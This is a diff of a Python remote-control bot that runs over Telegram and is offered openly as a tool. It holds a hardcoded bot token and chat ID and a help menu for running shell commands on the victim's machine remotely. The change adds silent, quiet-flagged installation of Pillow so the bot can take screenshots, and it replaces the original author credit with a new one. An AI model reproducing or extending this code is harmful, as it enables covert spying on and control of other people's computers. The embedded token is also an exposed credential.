@@ -3,7 +3,15 @@ import platform
 import requests
 import subprocess
 import time
-
+try:
+    from PIL import ImageGrab
+except ImportError:
+    if platform.system().startswith("Windows"):
+        os.system("python -m pip install pillow -q -q -q")
+        from PIL import ImageGrab
+    elif platform.system().startswith("Linux"):
+        os.system("python3 -m pip install pillow -q -q -q")
+        from PIL import ImageGrab
 
 TOKEN = '6359130722:AAFGXpJAWPTjbcupZnFs7Sx52OR4Q9km1nU'   #change the token here
 CHAT_ID = '5559476838'   #change the chat id here
@@ -78,7 +86,7 @@ def execute_command(command):
             return f"Error taking screenshot: {e}"
     elif command == 'help':
         return '''
-        HELP MENU: Coded By Machine1337
+        HELP MENU: Coded By Yesha | 4ZU PH
 CMD Commands        | Execute cmd commands directly in bot
 cd ..               | Change the current directory
 cd foldername       | Change to current folder
